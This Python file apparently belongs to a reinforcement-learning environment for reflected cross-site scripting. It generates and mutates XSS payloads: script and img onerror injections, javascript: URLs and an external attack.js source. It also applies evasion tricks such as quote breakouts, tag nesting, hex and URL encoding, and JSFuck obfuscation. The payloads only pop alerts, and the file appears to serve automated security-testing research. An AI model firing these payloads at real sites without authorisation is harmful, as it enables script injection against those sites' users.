from bs4 import BeautifulSoup
from random import choice
import gym_reflected_xss.envs.action as act
import gym_reflected_xss.envs.observation as obs
import base64
from urllib import parse
from gym_reflected_xss.input_module.pyjsfuck import JSFuck
import numpy as np 
import random 
class InputGenerator():

    def __init__(self):
        # define element of attack payload
        self.INITIAL_STATUS = np.array([0.0] * obs.STATE_SIZE)
        self.prefixList = ["--> ", '"> ', "", "'> ", "/> ", '> ', ';} ']
        self.prefixHTMLList = ['"> ', "'> ", "/> ", '> ']
        self.prefixComment = "--> "
        self.prefixStyle = ';} '
        self.forebracket1 = "<"
        self.scriptTag="script"
        self.mediaTag = ["img", "audio", "video"]
        self.linkTag = ["a"]
        self.htmlattr = ["src"]
        self.urlattr = ['src', "href"]
        self.htmlevent = ["onerror"]
        self.forebracket2 = ">"
        self.tempPayload = "x"
        self.JSPayload = 'alert(0727);'
        self.URLPayload = "javascript:alert(0727)"
        self.JSFILEPayload = "http://data/attack.js"
        self.backbracket = "</"
        self.backbracket2 = ">"
        self.suffixList = ["<!--", "//", ""]
        self.previous_input = ""
        self.current_input = ""
        self.tag = "" 
        self.attribute = "" 
        self.event = ""
        self.value = "" 
        self.prefix = "" 
        self.suffix = "" 
        self.status = self.INITIAL_STATUS
        self.previous_action = -1
        self.current_action = -1
        self.effective_tag = []
        self.original_tag = ""
        self.use_saved_tag = False
        self.input_corpus = {'steps':0}
        self.random_tag = "980727"


    def do_action(self, action, max_try):
        add_random = True
        # random interger for detecion of attack string in the html page
        self.random_tag = str(random.randint(10000,20000))

        self.previous_action = self.current_action
        self.current_action = action
       
        # action information history
        self.status[obs.PREVIOUS_ACTION] = self.previous_action
        self.status[obs.CURRENT_ACTION] = self.current_action
        
        
        self.attack_src_attribute = False

        # initialize encoding 
        self.status[obs.HEXA_ENCODING] = 0
        #self.status[obs.BASE64] = 0
        self.status[obs.URL_ENCODING] = 0
        self.status[obs.CODE_OBSFUSCATION] = 0

        # ----- Basic Generation Part ----- 
        if action == act.USING_SCRIPT_TAG:
            self.use_saved_tag = False
            self.original_tag = ""
            self.action_0()
     
        elif action == act.PATTERN2_PAYLOAD:
            self.use_saved_tag = False
            self.original_tag = ""
            self.action_1()
        
        elif action == act.PATTERN3_PAYLOAD: 
            self.use_saved_tag = False
            self.original_tag = ""
            self.attack_src_attribute = True
            self.action_2()
        # ------------------------------------

        
        elif action == act.MUTATE_PREFIX_SLASHBRACKET:
            self.prefix = "/> " 
            pass

        elif action == act.MUTATE_HTML_TAG:
            self.original_tag = ""

            if self.tag == "script":
                self.action_1()
            elif self.tag in self.mediaTag:
                self.tag = choice(self.mediaTag)
            elif self.tag in self.linkTag:
                self.tag = choice(self.linkTag)

        elif action == act.MUTATE_PREFIX_DOUBLE_QUOTE:
            self.prefix = '" ' 

        elif action == act.MUTATE_PREFIX_SINGLE_QUOTE:
            self.prefix = "' " 

        elif action == act.MUTATE_PREFIX_DOUBLE_QUOTE_BRACKET:
            self.prefix = '"> '

        elif action == act.MUTATE_PREFIX_SINGLE_QUOTE_BRACKET:
            self.prefix = "'> "

        elif action == act.MUTATE_PREFIX_BRACKET:
            self.prefix = "> "

        elif action == act.MUTATE_SUFFIX_HTML_COMMENT:
            self.suffix = " <!--"

        elif action == act.MUTATE_JS_COMMENT:
            self.suffix = "/*"
            self.prefix = "*/"
        elif action == act.MUTATE_SUFFIX_SINGLE_QUOTATION:
            self.suffix = " '"
        elif action == act.MUTATE_SUFFIX_DOUBLE_QUOTATION:
            self.suffix = ' "'

        elif action == act.TAG_LOWER_TO_UPPER:
            new_tag = ''.join(str.upper(c) for c in self.tag)
            self.tag = new_tag
            self.status[obs.CHARACTER_UPPER] = 1

        elif action == act.INSERT_TAG_INTO_TAG:
            if self.tag in ["script"]  + self.mediaTag + self.linkTag:
                length = len(self.tag)
                if self.original_tag == "":
                    self.original_tag = self.tag
                self.tag = ''.join([self.tag[0:length//2],self.tag,self.tag[length//2:length]])
                self.status[obs.TAG_INSERTED] = 1
            elif self.original_tag:
                length = len(self.original_tag)
                self.tag = ''.join([self.original_tag[0:length//2] , self.original_tag , self.original_tag[length//2:length]])
                self.status[obs.TAG_INSERTED] = 1



        elif action == act.INSERT_EFFECTIVE_TAG:

            if self.effective_tag != []:
                self.use_saved_tag = True
                self.status[obs.INSERT_EFFECTIVE_TAG] = 1

        elif action == act.MUTATE_PREFIX_COMMENT:
            self.prefix = self.prefixComment 

        elif action == act.MUTATE_PREFIX_STYLE:
            self.prefix = self.prefixStyle

        elif action == act.MUTATE_PREFIX_SINGLE_QUOTE_SEMIC:
            self.prefix = "'; "

        elif action == act.MUTATE_PREFIX_DOUBLE_QUOTE_SEMIC:
            self.prefix = '"; '
        
        
        #elif action == act.MUTATE_PREFIX_DUMMY_SEMIC:
        #    self.prefix = "1234; "
        
        elif action == act.PREFIX_ENTER:
            self.prefix = "\r\n"
        elif action == act.MUTATE_PREFIX_STRING_VALUE:
            self.prefix = 'dummy '

        elif action == act.URL_VALUE:

            self.use_saved_tag = False
            self.suffix = '' 
            self.prefix = '' 
            self.original_tag = ""
            self.tag = ""
            self.event = ""
            self.attribute = "string"
            self.value = self.URLPayload  
            self.status[obs.HTML_TAG_USED] = 0
            self.status[obs.HTML_SCRIPT_TAG_USED] = 0
            self.status[obs.HTML_MEDIA_TAG_USED] = 0

            self.status[obs.EVENT_ELEMENT] = 0
            self.status[obs.ATTRIBUTE_ELEMENT] = 0
            self.status[obs.JS_PAYLOAD] = 0
            self.status[obs.URL_PAYLOAD] = 1
            self.status[obs.CHARACTER_UPPER] = 0
            self.status[obs.TAG_INSERTED] = 0      
            self.status[obs.JAVASCRIPT_FILE_NAME] = 0
            self.status[obs.JAVASCRIPT_CODE] = 0
            self.status[obs.ATTRIBUTE_UPPER] = 0
            self.status[obs.NO_WHITE_SPACE] = 0


        elif action == act.JAVASCRIPT_FILE:

            self.use_saved_tag = False
            self.suffix = '' 
            self.prefix = '' 
            self.original_tag = ""
            self.tag = ""
            self.event = ""
            self.attribute = "string"
            self.value = self.JSFILEPayload
            self.status[obs.HTML_TAG_USED] = 0
            self.status[obs.HTML_SCRIPT_TAG_USED] = 0
            self.status[obs.HTML_MEDIA_TAG_USED] = 0

            self.status[obs.EVENT_ELEMENT] = 0
            self.status[obs.ATTRIBUTE_ELEMENT] = 0
            self.status[obs.JS_PAYLOAD] = 0
            self.status[obs.URL_PAYLOAD] = 0
            self.status[obs.CHARACTER_UPPER] = 0
            self.status[obs.TAG_INSERTED] = 0  
            self.status[obs.JAVASCRIPT_FILE_NAME] = 1
            self.status[obs.JAVASCRIPT_CODE] = 0
            self.status[obs.ATTRIBUTE_UPPER] = 0
            self.status[obs.NO_WHITE_SPACE] = 0

        elif action == act.SRC_URL:
            self.use_saved_tag = False
            self.suffix = '' 
            self.prefix = '' 
            self.original_tag = ""
            self.tag = ""
            self.event = ""
            self.attribute = "src"
            self.value = self.JSFILEPayload
            self.status[obs.HTML_TAG_USED] = 0
            self.status[obs.HTML_SCRIPT_TAG_USED] = 0
            self.status[obs.HTML_MEDIA_TAG_USED] = 0

            self.status[obs.EVENT_ELEMENT] = 0
            self.status[obs.ATTRIBUTE_ELEMENT] = 1
            self.status[obs.JS_PAYLOAD] = 0
            self.status[obs.URL_PAYLOAD] = 0
            self.status[obs.CHARACTER_UPPER] = 0
            self.status[obs.TAG_INSERTED] = 0  
            self.status[obs.JAVASCRIPT_FILE_NAME] = 1
            self.status[obs.JAVASCRIPT_CODE] = 0
            self.status[obs.ATTRIBUTE_UPPER] = 0
            self.status[obs.NO_WHITE_SPACE] = 0

        elif action == act.IN_JAVASCRIPT:
            self.suffix = '' 
            self.prefix = '' 
            self.use_saved_tag = False
            self.original_tag = ""
            self.tag = ""
            self.attribute = "string"
            self.value = self.JSPayload
            self.status[obs.HTML_TAG_USED] = 0
            self.status[obs.HTML_SCRIPT_TAG_USED] = 0
            self.status[obs.HTML_MEDIA_TAG_USED] = 0

            self.status[obs.EVENT_ELEMENT] = 0
            self.status[obs.ATTRIBUTE_ELEMENT] = 0
            self.status[obs.JS_PAYLOAD] = 1
            self.status[obs.URL_PAYLOAD] = 0
            self.status[obs.CHARACTER_UPPER] = 0
            self.status[obs.TAG_INSERTED] = 0  
            self.status[obs.JAVASCRIPT_FILE_NAME] = 0
            self.status[obs.JAVASCRIPT_CODE] = 1
            self.status[obs.ATTRIBUTE_UPPER] = 0
            self.status[obs.NO_WHITE_SPACE] = 0


        elif action == act.TAG_ATTRIBUTE_UPPER:
            if self.attribute != "string":
                new_attribute = ''.join(str.upper(c) for c in self.attribute)
                self.attribute = new_attribute
                self.status[obs.ATTRIBUTE_UPPER] = 1

        elif action == act.IN_JAVASCRIPT_PREFIX_SUFFIX_DOUBLE:
            self.prefix = '"+ '
            self.suffix = ' +"'

        elif action == act.IN_JAVASCRIPT_PREFIX_SUFFIX_SINGLE:
            self.prefix = "'+ "
            self.suffix = " +'"

        elif action == act.HEXA_ENCODING:
            self.status[obs.HEXA_ENCODING] = 1

        elif action == act.WHITE_SPACE_TO_SLASH:
            self.status[obs.NO_WHITE_SPACE] = 1

        elif action == act.MUTATE_JAVA_SCRIPT:
            if self.status[obs.JS_PAYLOAD] == 1:
                self.value = choice(["prompt(1)", "confirm(1)"])


        elif action == act.DIVIDE_JAVASCRIPT:
            if self.status[obs.JS_PAYLOAD]:
                self.value = "'" + 'var A = "al" + "er" + "t(1);";eval(A);' + "'"
        
        elif action == act.JAVASCRIPT_NO_PARENTHESIS:
            if self.status[obs.HTML_SCRIPT_TAG_USED] == 1:
                self.value = "onerror=alert;throw 1"

        if action == act.MUTATE_QUOTATION_TO_BACK_TICK:
            self.prefix = self.prefix.replace("'",'`')
            self.prefix = self.prefix.replace('"','`')
            self.suffix = self.suffix.replace("'",'`')
            self.suffix = self.suffix.replace('"','`')
            self.value = self.value.replace('"','`')
            self.value = self.value.replace("'",'`')
            
        if action == act.MUTATE_PARENTHESIS_TO_BACK_TICK:
            self.prefix = self.prefix.replace(")",'`')
            self.prefix = self.prefix.replace('(','`')
            self.suffix = self.suffix.replace(")",'`')
            self.suffix = self.suffix.replace('(','`')
            self.value = self.value.replace(')','`')
            self.value = self.value.replace("(",'`')

        generated_input =""
        if self.tag != "":
            if self.use_saved_tag:
                generated_input = ''.join([self.prefix , "</" , choice(self.effective_tag) , ">" ,self.forebracket1, self.tag])
            else:
                self.status[obs.INSERT_EFFECTIVE_TAG] = 0
                generated_input = ''.join([self.prefix , self.forebracket1 , self.tag])
            
            if self.event:
                if self.attribute != "string" and self.attribute != "STRING" and action:
                    generated_input = ''.join([generated_input , " " , self.attribute , "=\'x\' ", self.event , "=" , self.value , " ", self.forebracket2])
                else:
                    generated_input = ''.join([generated_input , " " , self.event , "=" , self.value , " ",self.forebracket2])
            elif self.attribute != "string":
                generated_input = ''.join([generated_input , " " , self.attribute , "=" , self.value , " ",self.forebracket2])
            else:
                generated_input = ''.join([generated_input , ">" , self.value]) 
            generated_input = ''.join([generated_input , self.backbracket , self.tag , self.backbracket2 , self.suffix])
        else:
            
            if self.status[obs.EVENT_ELEMENT] == 1 and self.status[obs.JS_PAYLOAD] == 1:
                # generated_input = ''.join([self.prefix , "src=\'x\' " , self.event , "=" , self.value , self.suffix])
                generated_input = ''.join([self.prefix , self.event , "=" , self.value , self.suffix])
            elif self.status[obs.ATTRIBUTE_ELEMENT] == 1 and self.status[obs.JAVASCRIPT_FILE_NAME] == 1:
                generated_input = ''.join([self.prefix , self.attribute , "=" , self.value , self.suffix])
            elif self.value != "":
                generated_input = ''.join([self.prefix , self.value , self.suffix])

        

        if action == act.HEXA_ENCODING:
            add_random = False
            generated_input = self.hexa_encoding(generated_input)

        if action == act.WHITE_SPACE_TO_SLASH:
            generated_input = self.whilte_space_to_slash(generated_input)

        """if action == act.BASE64_ENCODING:
            add_random = False
            encoded_input = base64.b64encode(generated_input.encode('utf-8'))
            encoded_input = str(encoded_input, 'utf-8')
            generated_input = ''.join(["data:text/html;base64,",encoded_input])
            self.status[obs.BASE64] = 1"""
        
        if action == act.URL_ENCODING:
            add_random = False
            generated_input = parse.quote(generated_input)
            self.status[obs.URL_ENCODING] = 1

        if action == act.CODE_OBFUSCATION:
            add_random = False
            jsf = JSFuck()
            generated_input = jsf.encode(generated_input)
            self.status[obs.CODE_OBSFUSCATION] = 1


        # make observation about genrated input
        if "script" in generated_input:
            self.status[obs.CONTAIN_SCRIPT_STRING] = 1
        else:
            self.status[obs.CONTAIN_SCRIPT_STRING] = 0

        if "'" in generated_input:
            self.status[obs.SINGLE_QUOTATION] = 1
        else:
            self.status[obs.SINGLE_QUOTATION] = 0

        if '"' in generated_input:
            self.status[obs.DOUBLE_QUOTATION] = 1
        else:
            self.status[obs.DOUBLE_QUOTATION] = 0

        if "/" in generated_input:
            self.status[obs.BACKSLASH] = 1
        else:
            self.status[obs.BACKSLASH] = 0

        if "--" in generated_input:
            self.status[obs.HTML_COMMENT_USED] = 1
        else:
            self.status[obs.HTML_COMMENT_USED] = 0

        if "dummy" in generated_input:
            self.status[obs.STRING_PREFIX] = 1
        else: 
            self.status[obs.STRING_PREFIX] = 0

        if "(" in generated_input or ")" in generated_input:
            self.status[obs.PARENTHESIS] = 1
        else:
            self.status[obs.PARENTHESIS] = 0

        if "`" in generated_input:
            self.status[obs.BACK_TICK] = 1
        else:
            self.status[obs.BACK_TICK] = 0
        
        if "<" in generated_input or ">" in generated_input:
            self.status[obs.BRACKET] = 1
        else:
            self.status[obs.BRACKET] = 0

        if "alert" in generated_input:
            self.status[obs.ALERT_STRING] = 1
        else:
            self.status[obs.ALERT_STRING] = 0

        if "*" in generated_input:
            self.status[obs.JS_COMMENT_USED] = 1
        else:
            self.status[obs.JS_COMMENT_USED] = 0

        if "\r\n" in generated_input:
            self.status[obs.PREFIX_ENTER] = 1
        else:
            self.status[obs.PREFIX_ENTER] = 0

        # print("generated: " + generated_input)
        self.previous_input = self.current_input
        self.current_input = generated_input

        # add to dictionary
        cnt_step = self.input_corpus['steps'] + 1
        self.input_corpus['steps'] = cnt_step
        if generated_input == "":
            key_input = "space"
        else:
            key_input = generated_input
        if key_input in self.input_corpus:
            new_value = self.input_corpus[key_input] + 1
            self.input_corpus[key_input] = new_value
        else:
            self.input_corpus[key_input] = 1
        
        if ( self.input_corpus[key_input] - 1) > 0:
            self.status[obs.INPUT_CORPUS] = (self.input_corpus[key_input] - 1) / 500
            
        #print(self.status[obs.INPUT_CORPUS])
        #print(self.input_corpus[key_input] / self.input_corpus['steps'])
        # if default payload is number, we add number infront of the payload
        if self.status[obs.DEFAULT_PAYLOAD_TYPE] == 1 and add_random and self.tag != "" :
            return ''.join([str(self.random_tag), generated_input,str(self.random_tag) ])
        elif add_random and self.tag != "" :
            return ''.join([generated_input,str(self.random_tag) ])
        else:
            return generated_input


    def hexa_encoding(self,result):
        result = result.replace('<',r"\74")
        result = result.replace('>',r'\76')
        return result
    
    def whilte_space_to_slash(self,result):
        result = result.replace(' ', '/')
        return result

    def action_0(self):
        self.init_status()
        self.prefix = ""
        self.tag = "script" 
        self.attribute = "string" 
        self.event = ""
        self.value = self.JSPayload
        self.suffix = ""  
        self.status[obs.HTML_TAG_USED] = 1
        self.status[obs.HTML_SCRIPT_TAG_USED] = 1
        self.status[obs.HTML_MEDIA_TAG_USED] = 0

        self.status[obs.EVENT_ELEMENT] = 0
        self.status[obs.ATTRIBUTE_ELEMENT] = 0
        self.status[obs.JS_PAYLOAD] = 1
        self.status[obs.URL_PAYLOAD] = 0
        self.status[obs.CHARACTER_UPPER] = 0
        self.status[obs.TAG_INSERTED] = 0
        self.status[obs.JAVASCRIPT_FILE_NAME] = 0
        self.status[obs.JAVASCRIPT_CODE] = 0
        self.status[obs.NO_WHITE_SPACE] = 0


    def action_1(self):
        self.init_status()
        self.prefix = ""
        self.tag = choice(self.mediaTag)
        self.attribute = "src" 
        self.event = choice(self.htmlevent)
        self.value = self.JSPayload
        self.suffix = ""  
        self.status[obs.HTML_TAG_USED] = 1
        self.status[obs.HTML_SCRIPT_TAG_USED] = 0
        self.status[obs.HTML_MEDIA_TAG_USED] = 1

        self.status[obs.EVENT_ELEMENT] = 1
        self.status[obs.ATTRIBUTE_ELEMENT] = 1
        self.status[obs.JS_PAYLOAD] = 1
        self.status[obs.URL_PAYLOAD] = 0
        self.status[obs.CHARACTER_UPPER] = 0
        self.status[obs.TAG_INSERTED] = 0
        self.status[obs.JAVASCRIPT_FILE_NAME] = 0
        self.status[obs.JAVASCRIPT_CODE] = 0
        self.status[obs.ATTRIBUTE_UPPER] = 0
        self.status[obs.NO_WHITE_SPACE] = 0


    def action_2(self):
        self.init_status()
        self.prefix = ""
        self.tag = ""
        self.attribute = "" 
        self.event = "onmouseover"
        self.value = 'alert(0727);'
        self.suffix = '' 
        self.status[obs.HTML_TAG_USED] = 0
        self.status[obs.HTML_SCRIPT_TAG_USED] = 0
        self.status[obs.HTML_MEDIA_TAG_USED] = 0

        self.status[obs.EVENT_ELEMENT] = 1
        self.status[obs.ATTRIBUTE_ELEMENT] = 0
        self.status[obs.JS_PAYLOAD] = 1
        self.status[obs.URL_PAYLOAD] = 0
        self.status[obs.CHARACTER_UPPER] = 0
        self.status[obs.TAG_INSERTED] = 0
        self.status[obs.JAVASCRIPT_FILE_NAME] = 0
        self.status[obs.JAVASCRIPT_CODE] = 0
        self.status[obs.ATTRIBUTE_UPPER] = 0
        self.status[obs.NO_WHITE_SPACE] = 0


    def init_status(self):
        for i in range(0, 18):
            self.status[i] = 0
    
    def initialize_all_state(self):
        for i in range(0, len(self.status)):
            self.status[i] = 0
